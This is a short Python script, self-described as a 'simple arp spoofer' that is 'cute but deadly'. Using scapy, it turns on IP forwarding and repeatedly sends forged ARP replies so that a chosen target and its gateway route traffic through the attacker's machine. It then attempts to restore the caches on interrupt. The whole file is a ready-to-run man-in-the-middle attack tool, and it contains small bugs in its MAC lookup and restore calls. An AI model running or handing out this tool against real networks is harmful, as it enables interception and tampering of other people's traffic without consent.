# simple arp spoofer
# cute but deadly ;)
import scapy.all as scapy
import time
import sys
import os


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

target_ip = sys.argv[1]
gateway_ip = sys.argv[2]

def poison(target, gateway):
	packet = scapy.ARP(op=2, pdst=target, hwdst=scapy.getmacbyip(target_ip), psrc=gateway)
	scapy.send(packet, verbose=False)
	print(f"[*] poisoning the arp between {target} {gateway} ")

def restore(gateway, target):
	dst_mac = scapy.getmacbyip(gateway)
	src_mac = scapy.getmacbyip(target)
	packet = scapy.ARP(op=2, pdst=gateway, hwdst=dst_mac, psrc=target, hwsrc=src_mac)
	scapy.send(packet, verbose=False)
	print("\n[+] arp connections has been restored to default")

try:
	while True:
		poison(target_ip, gateway_ip)
		poison(gateway_ip, target_ip)
		time.sleep(3)
except KeyboardInterrupt:
	restore(gateway_ip, target_ip)
	restore(target_ip, target_ip)